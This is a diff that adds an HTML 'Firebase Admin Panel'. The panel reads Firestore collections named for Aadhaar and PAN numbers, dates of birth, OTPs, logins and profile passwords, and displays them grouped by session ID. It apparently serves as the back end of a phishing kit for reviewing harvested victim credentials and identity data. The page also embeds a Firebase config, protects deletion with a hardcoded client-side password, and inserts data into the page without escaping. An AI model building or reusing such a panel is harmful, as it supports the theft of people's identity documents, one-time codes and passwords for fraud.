@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Firebase Admin Panel</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
+    .container { padding: 20px; max-width: 100%; margin: auto; }
+    h1 { text-align: center; color: #00008b; }
+
+    .scroll-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      padding: 0 10px;
+    }
+
+    .scroll-buttons .btn-large, .scroll-buttons .btn-small {
+      background: #00008b; color: white; border: none;
+      border-radius: 20px; cursor: pointer;
+    }
+    .btn-large { padding: 8px 14px; font-size: 14px; }
+    .btn-small { padding: 6px 10px; font-size: 12px; background: #555; }
+
+    .btn-large:hover { background: #001f5c; }
+    .btn-small:hover { background: #333; }
+
+    .panel-layout {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .section {
+      display: none;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      max-height: 600px;
+      overflow-y: auto;
+    }
+
+    .section.active {
+      display: block;
+    }
+
+    h2 {
+      margin: 0; padding: 10px;
+      background: #00008b; color: white;
+      border-radius: 5px;
+    }
+
+    .entry {
+      background: #f9f9f9;
+      padding: 10px;
+      margin-top: 10px;
+      border-left: 5px solid #00008b;
+      position: relative;
+      transition: all 0.2s ease-in-out;
+    }
+
+    .entry:hover {
+      background: #e8f0ff;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      transform: scale(1.01);
+    }
+
+    pre {
+      margin: 0;
+      font-size: 14px;
+    }
+
+    .delete-btn {
+      position: absolute;
+      top: 70px;
+      right: 0px;
+      background: red;
+      color: white;
+      border: none;
+      padding: 1px 5px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="adminPanel">
+    <h1>Firebase Admin Panel</h1>
+    <div class="scroll-buttons" id="scrollButtons"></div>
+    <div class="panel-layout" id="panelContainer"></div>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const collections = [
+      'aadhaar_entries',
+      'dob_entries',
+      'logins',
+      'otp_entries',
+      'pan_entries',
+      'profile_passwords'
+    ];
+
+    loadPanelLayout();
+
+    function loadPanelLayout() {
+      const panel = document.getElementById("panelContainer");
+      const buttonRow = document.getElementById("scrollButtons");
+      panel.innerHTML = "";
+      buttonRow.innerHTML = "";
+
+      const topButtons = ['ALL_DATA', 'AADHAAR_ENTRIES', 'DOB_ENTRIES', 'LOGINS'];
+      const bottomButtons = ['OTP_ENTRIES', 'PAN_ENTRIES', 'PROFILE_PASSWORDS'];
+
+      const renderButton = (label, id, small = false) => {
+        const btn = document.createElement("button");
+        btn.textContent = label.replace(/_/g, " ");
+        btn.className = small ? "btn-small" : "btn-large";
+        btn.onclick = () => showOnlySection(id.toLowerCase() + "_section");
+        buttonRow.appendChild(btn);
+      };
+
+      const showOnlySection = (id) => {
+        document.querySelectorAll(".section").forEach(sec => sec.classList.remove("active"));
+        const target = document.getElementById(id);
+        if (target) target.classList.add("active");
+      };
+
+      topButtons.forEach(col => renderButton(col, col));
+      bottomButtons.forEach(col => renderButton(col, col, true));
+
+      const allSection = document.createElement("div");
+      allSection.className = "section active";
+      allSection.id = "all_data_section";
+      allSection.innerHTML = "<h2>ALL DATA (SESSION WISE)</h2><div id='allDataContent'></div>";
+      panel.appendChild(allSection);
+
+      const allData = [];
+
+      collections.forEach(col => {
+        const section = document.createElement("div");
+        section.className = "section";
+        section.id = col + "_section";
+
+        const title = document.createElement("h2");
+        title.textContent = col.replace(/_/g, " ").toUpperCase();
+        section.appendChild(title);
+
+        const content = document.createElement("div");
+        section.appendChild(content);
+        panel.appendChild(section);
+
+        db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
+          content.innerHTML = "";
+
+          snapshot.docs.forEach(doc => {
+            const data = doc.data();
+            const filteredData = {};
+            Object.keys(data).forEach(k => {
+              if (!['timestamp', '__collection', 'attempt', 'valid'].includes(k)) {
+                filteredData[k] = data[k];
+              }
+            });
+
+            const entry = document.createElement("div");
+            entry.className = "entry";
+            entry.innerHTML = `<pre>${JSON.stringify(filteredData, null, 2)}</pre>`;
+
+            const delBtn = document.createElement("button");
+            delBtn.className = "delete-btn";
+            delBtn.textContent = "Delete";
+            delBtn.onclick = () => {
+              const input = prompt("Enter delete password:");
+              if (input === "4542") {
+                db.collection(col).doc(doc.id).delete();
+              } else {
+                alert("Wrong password");
+              }
+            };
+
+            entry.appendChild(delBtn);
+            content.appendChild(entry);
+
+            allData.push({ ...filteredData, __collection: col, timestamp: data.timestamp });
+            allData.sort((a, b) => b.timestamp?.seconds - a.timestamp?.seconds);
+            renderAllData(allData);
+          });
+        });
+      });
+    }
+
+    function renderAllData(dataArray) {
+      const allContent = document.getElementById("allDataContent");
+      if (!allContent) return;
+      allContent.innerHTML = "";
+      const sessionGroupedData = {};
+
+      dataArray.forEach(data => {
+        const sessionId = data.sessionId || "No Session";
+        if (!sessionGroupedData[sessionId]) {
+          sessionGroupedData[sessionId] = [];
+        }
+        sessionGroupedData[sessionId].push(data);
+      });
+
+      Object.keys(sessionGroupedData).forEach(sessionId => {
+        const sessionData = sessionGroupedData[sessionId];
+        const sessionDiv = document.createElement("div");
+        sessionDiv.className = "entry";
+        sessionDiv.innerHTML = `<h3>Session ID: ${sessionId}</h3>`;
+
+        sessionData.forEach(data => {
+          const entryDiv = document.createElement("div");
+          entryDiv.className = "entry";
+          delete data.timestamp;
+          entryDiv.innerHTML = `<pre>[${data.__collection}]\n${JSON.stringify(data, null, 2)}</pre>`;
+          sessionDiv.appendChild(entryDiv);
+        });
+
+        allContent.appendChild(sessionDiv);
+      });
+    }
+  </script>
+</body>
+</html>
